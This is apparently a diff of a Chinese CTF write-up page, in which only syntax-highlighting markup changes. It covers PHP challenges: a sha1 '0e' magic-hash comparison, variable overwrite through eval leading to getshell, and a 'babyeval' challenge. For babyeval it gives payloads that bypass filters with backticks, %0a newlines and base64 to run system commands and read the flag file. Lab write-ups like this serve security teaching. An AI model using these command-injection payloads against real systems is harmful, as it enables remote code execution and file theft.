-    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$res</span> == hash(<span class="hljs-string">&#x27;sha1&#x27;</span>, <span class="hljs-variable">$res</span>)) &#123;
-        print_r(<span class="hljs-variable">$res</span>);
+    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$res</span> == <span class="hljs-title function_ invoke__">hash</span>(<span class="hljs-string">&#x27;sha1&#x27;</span>, <span class="hljs-variable">$res</span>)) &#123;
+        <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$res</span>);
     &#125;
 &#125;
 </code></pre></div>
 
-<p>所以verif=0e1290633704</p>
+<p>所以verif&#x3D;0e1290633704</p>
 <p>重点在这</p>
-<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span> (array_keys(<span class="hljs-variable">$GLOBALS</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>) &#123;
-        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/var\d&#123;1,2&#125;/&#x27;</span>, <span class="hljs-variable">$key</span>) &amp;&amp; strlen(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-variable">$key</span>]) &lt; <span class="hljs-number">12</span>) &#123;
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span> (<span class="hljs-title function_ invoke__">array_keys</span>(<span class="hljs-variable">$GLOBALS</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>) &#123;
+        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/var\d&#123;1,2&#125;/&#x27;</span>, <span class="hljs-variable">$key</span>) &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-variable">$key</span>]) &lt; <span class="hljs-number">12</span>) &#123;
             @<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;\$<span class="hljs-subst">$key</span>&quot;</span> . <span class="hljs-string">&#x27;=&quot;&#x27;</span> . <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-variable">$key</span>] . <span class="hljs-string">&#x27;&quot;;&#x27;</span>);
         &#125;
     &#125;</code></pre></div>
 
 <ul>
-<li>这段是将设置var开头，后面带1到2个数字变量的值，类似于var1=xxx或者var12=xxx 这样的</li>
+<li>这段是将设置var开头，后面带1到2个数字变量的值，类似于var1&#x3D;xxx或者var12&#x3D;xxx 这样的</li>
 <li>由于变量覆盖的环节限制了单双引号的输入，所以这里的解法为利用php复杂变量getshell</li>
 </ul>
 <p>什么是php复杂变量getshell</p>
@@ -511,16 +511,16 @@ getVars();
 <h2 id="babyeval"><a href="#babyeval" class="headerlink" title="babyeval"></a>babyeval</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
     <span class="hljs-comment">// flag在flag.php</span>
     <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]))&#123;
-        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/\(.*\)/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]))
+        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\(.*\)/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]))
             <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!!!&#x27;</span>);
-        ob_start(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;
-                 <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$data</span>, <span class="hljs-string">&#x27;flag&#x27;</span>) !== <span class="hljs-literal">false</span>)
+        <span class="hljs-title function_ invoke__">ob_start</span>(function(<span class="hljs-variable">$data</span>)&#123;
+                 <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&#x27;flag&#x27;</span>) !== <span class="hljs-literal">false</span>)
                  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;ByeBye hacker&#x27;</span>;
                  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
                  &#125;);
         <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);
     &#125; <span class="hljs-keyword">else</span> &#123;
-        highlight_file(<span class="hljs-keyword">__FILE__</span>);
+        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
     &#125;
     <span class="hljs-meta">?&gt;</span></code></pre></div>
 
@@ -531,14 +531,14 @@ getVars();
 <p>3.function($data)，这个函数过滤了flag字段，所以不能包含flag</p>
 <p>4.绕过上面两个后就可以执行eval()</p>
 </blockquote>
-<p>可以使用echo配合``绕过上面的检测</p>
+<p>可以使用echo配合&#96;&#96;绕过上面的检测</p>
 <div class="hljs"><pre><code class="hljs autohotkey">echo `base64 f*`;</code></pre></div>
 
 <p>但是一般想到的应该是</p>
 <div class="hljs"><pre><code class="hljs abnf">system(<span class="hljs-string">&quot;cat /flag.php&quot;</span>)<span class="hljs-comment">;</span></code></pre></div>
 
 <p>可以利用%0a绕过，%0a对应的ascii码为换行符，并且为base64格式显示，不然会被拦截</p>
-<div class="hljs"><pre><code class="hljs ini"><span class="hljs-attr">a</span>=system(<span class="hljs-string">&quot;%0acat /f*|%20base64&quot;</span>)<span class="hljs-comment">;</span></code></pre></div>
+<div class="hljs"><pre><code class="hljs abnf"><span class="hljs-attribute">a</span><span class="hljs-operator">=</span>system(<span class="hljs-string">&quot;%0acat /f*|%20base64&quot;</span>)<span class="hljs-comment">;</span></code></pre></div>
 
 
 
